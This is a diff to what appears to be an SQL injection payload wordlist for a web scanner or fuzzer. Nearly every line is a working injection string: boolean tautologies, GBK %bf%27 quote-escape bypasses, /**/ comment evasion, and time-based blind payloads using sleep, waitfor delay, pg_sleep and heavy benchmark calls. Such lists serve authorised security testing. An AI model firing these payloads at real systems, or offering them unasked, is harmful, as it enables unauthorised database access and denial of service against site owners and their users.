@@ -8,6 +8,7 @@
 %3B
 )
 *
+%bf%27
 &apos;
 \u02BA
 %CA%BA
@@ -34,6 +35,8 @@ or "WsXeDC"="WsXeDC
 and "WsXeDC"="null
 or 987=987
 and 987=789
+%bf%27/**/or/**/1=1/**/%23
+%bf%27/**/or/**/1=2/**/%23
 1;waitfor delay '0:0:15'--
 1);waitfor delay '0:0:15'--
 1';waitfor delay '0:0:15'--
@@ -68,7 +71,7 @@ AND 1239=(SELECT COUNT(*) FROM GENERATE_SERIES(1,15000000))
 AND 1239=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(123900000000/2))))
 ' AND 1239=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(123900000000/2))))  and 'arv'='arv
 " AND 1239=LIKE("ABCDEFG",UPPER(HEX(RANDOMBLOB(123900000000/2))))  and "arv"="arv
-sleep(__TIME__)#
+sleep(15)#
 1 or sleep(15)#
 " or sleep(15)#
 ' or sleep(15)#
@@ -80,33 +83,74 @@ sleep(__TIME__)#
 1)) or sleep(15)#
 ")) or sleep(15)="
 ')) or sleep(15)='
+1/**/or/**/sleep(15)#
+"/**/or/**/sleep(15)#
+'/**/or/**/sleep(15)#
+"/**/or/**/sleep(15)="
+'/**/or/**/sleep(15)='
+1)/**/or/**/sleep(15)#
+")/**/or/**/sleep(15)="
+')/**/or/**/sleep(15)='
+1))/**/or/**/sleep(15)#
+"))/**/or/**/sleep(15)="
+'))/**/or/**/sleep(15)='
+%bf%27
 ;waitfor delay '0:0:15'--
 );waitfor delay '0:0:15'--
 ';waitfor delay '0:0:15'--
+%bf%27;waitfor delay '0:0:15'--
 ";waitfor delay '0:0:15'--
 ');waitfor delay '0:0:15'--
+%bf%27);waitfor delay '0:0:15'--
 ");waitfor delay '0:0:15'--
 ));waitfor delay '0:0:15'--
 '));waitfor delay '0:0:15'--
+%bf%27));waitfor delay '0:0:15'--
 "));waitfor delay '0:0:15'--
-benchmark(10000000,MD5(1))#
-1 or benchmark(10000000,MD5(1))#
-" or benchmark(10000000,MD5(1))#
-' or benchmark(10000000,MD5(1))#
-1) or benchmark(10000000,MD5(1))#
-") or benchmark(10000000,MD5(1))#
-') or benchmark(10000000,MD5(1))#
-1)) or benchmark(10000000,MD5(1))#
-")) or benchmark(10000000,MD5(1))#
-')) or benchmark(10000000,MD5(1))#
+benchmark(100000000,SHA(1))#
+1 or benchmark(100000000,SHA(1)))#
+" or benchmark(100000000,SHA(1))#
+" or 1=1-benchmark(100000000,SHA(1)) or "a"="a
+' or benchmark(100000000,SHA(1))#
+' or 1=1-benchmark(100000000,SHA(1)) or 'a'='a
+%bf%27 or benchmark(100000000,SHA(1))#
+%bf%27 or 1=1-benchmark(100000000,SHA(1)) or %bf%27a%bf%27=%bf%27a
+1) or benchmark(100000000,SHA(1))#
+") or benchmark(100000000,SHA(1))#
+') or benchmark(100000000,SHA(1))#
+%bf%27) or benchmark(100000000,SHA(1))#
+1)) or benchmark(100000000,SHA(1))#
+")) or benchmark(100000000,SHA(1))#
+')) or benchmark(100000000,SHA(1))#
+%bf%27)) or benchmark(100000000,SHA(1))#
+benchmark(100000000,SHA(1))#
+1/**/or/**/benchmark(100000000,SHA(1)))#
+"/**/or/**/benchmark(100000000,SHA(1))#
+"/**/or/**/1=1-benchmark(100000000,SHA(1))/**/or/**/"a"="a
+'/**/or/**/benchmark(100000000,SHA(1))#
+'/**/or/**/1=1-benchmark(100000000,SHA(1))/**/or/**/'a'='a
+%bf%27/**/or/**/benchmark(100000000,SHA(1))#
+%bf%27/**/or/**/1=1-benchmark(100000000,SHA(1))/**/or/**/%bf%27a%bf%27=%bf%27a
+1)/**/or/**/benchmark(100000000,SHA(1))#
+")/**/or/**/benchmark(100000000,SHA(1))#
+')/**/or/**/benchmark(100000000,SHA(1))#
+%bf%27)/**/or/**/benchmark(100000000,SHA(1))#
+1))/**/or/**/benchmark(100000000,SHA(1))#
+"))/**/or/**/benchmark(100000000,SHA(1))#
+'))/**/or/**/benchmark(100000000,SHA(1))#
+%bf%27))/**/or/**/benchmark(100000000,SHA(1))#
+"/**/or/**/1=1-benchmark(100000000,SHA(1))/**/or/**/"a"="a
 pg_sleep(15)--
 1 or pg_sleep(15)--
 " or pg_sleep(15)--
 ' or pg_sleep(15)--
+%bf%27 or pg_sleep(15)--
 1) or pg_sleep(15)--
 ") or pg_sleep(15)--
 ') or pg_sleep(15)--
+%bf%27) or pg_sleep(15)--
 1)) or pg_sleep(15)--
 ")) or pg_sleep(15)--
 ')) or pg_sleep(15)--
+%bf%27)) or pg_sleep(15)--
 1; SELECT pg_sleep(10);
